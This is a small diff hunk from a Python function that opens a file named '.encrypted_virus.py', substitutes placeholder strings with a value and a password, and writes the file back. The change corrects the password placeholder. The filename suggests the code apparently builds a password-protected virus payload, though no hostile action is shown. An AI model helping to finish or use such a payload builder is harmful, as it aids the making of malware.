@@ -455,7 +455,7 @@ def op():
 				with open('.encrypted_virus.py', 'r') as file :
 					filedata = file.read()
 					filedata = filedata.replace('abcde', nun)
-					filedata = filedata.replace('abcde', password)
+					filedata = filedata.replace('passe', password)
 				#########
 				with open('.encrypted_virus.py', 'w') as file:
 				 file.write(filedata)
